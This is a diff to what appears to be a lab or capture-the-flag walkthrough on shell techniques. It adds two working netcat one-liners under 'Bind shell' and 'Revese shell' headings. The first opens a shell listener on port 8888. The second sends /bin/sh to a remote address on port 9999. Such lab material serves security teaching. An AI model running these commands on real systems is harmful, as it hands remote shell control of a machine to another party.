@@ -697,9 +697,13 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 	* Bind shell
 
+		`mkfifo /tmp/f; nc -lvnp 8888 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+
 		![task13-common-bindshell](./images/task13-common-bindshell.png)
 
 	* Revese shell
+
+		`mkfifo /tmp/f; nc 10.13.52.88 9999 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
 
 		![task13-common-reverse](./images/task13-common-reverse.png)
 
